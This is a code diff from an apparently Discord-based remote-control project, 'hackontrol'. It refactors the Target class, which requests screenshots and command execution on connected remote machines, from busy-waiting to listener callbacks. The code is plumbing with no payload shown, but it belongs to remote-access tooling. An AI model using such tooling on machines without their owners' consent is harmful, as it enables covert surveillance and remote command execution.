@@ -1,6 +1,10 @@
 package com.khopan.hackontrol;
 
+import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
+
+import com.khopan.hackontrol.target.CommandListener;
+import com.khopan.hackontrol.target.ScreenshotListener;
 
 import net.dv8tion.jda.api.entities.Message.Attachment;
 
@@ -10,8 +14,8 @@ public class Target {
 
 	boolean connected;
 
-	private volatile byte[] image;
-	private volatile String commandResult;
+	private ScreenshotListener screenshotListener;
+	private CommandListener commandListener;
 
 	public Target(Hackontrol hackontrol, MachineId identifier) {
 		this.hackontrol = hackontrol;
@@ -23,20 +27,30 @@ public class Target {
 		return this.identifier;
 	}
 
-	public byte[] screenshot() {
-		this.check();
-		this.image = null;
-		this.hackontrol.request.screenshot();
-		while(this.image == null) {}
-		return this.image;
+	public ScreenshotListener getScreenshotListener() {
+		return this.screenshotListener;
 	}
 
-	public String command(String command) {
+	public CommandListener getCommandListener() {
+		return this.commandListener;
+	}
+
+	public void setScreenshotListener(ScreenshotListener screenshotListener) {
+		this.screenshotListener = screenshotListener;
+	}
+
+	public void setCommandListener(CommandListener commandListener) {
+		this.commandListener = commandListener;
+	}
+
+	public void screenshot() {
 		this.check();
-		this.commandResult = null;
+		this.hackontrol.request.screenshot();
+	}
+
+	public void command(String command) {
+		this.check();
 		this.hackontrol.request.command(command);
-		while(this.commandResult == null) {}
-		return this.commandResult;
 	}
 
 	void screenshotTaken(Attachment attachment) {
@@ -44,19 +58,36 @@ public class Target {
 			byte[] image;
 
 			try {
-				InputStream stream = attachment.getProxy().download().get();
-				image = stream.readAllBytes();
+				InputStream inputStream = attachment.getProxy().download().get();
+				ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+
+				while(true) {
+					int data = inputStream.read();
+
+					if(data == -1) {
+						break;
+					}
+
+					outputStream.write(data);
+				}
+
+				image = outputStream.toByteArray();
 			} catch(Throwable ignored) {
-				ignored.printStackTrace();
 				return;
 			}
 
-			this.image = image;
+			if(this.screenshotListener != null) {
+				this.screenshotListener.screenshotTaken(image);
+			}
 		}).start();
 	}
 
 	void commandResult(String result) {
-		this.commandResult = result;
+		new Thread(() -> {
+			if(this.commandListener != null) {
+				this.commandListener.commandResult(result);
+			}
+		}).start();
 	}
 
 	private void check() {
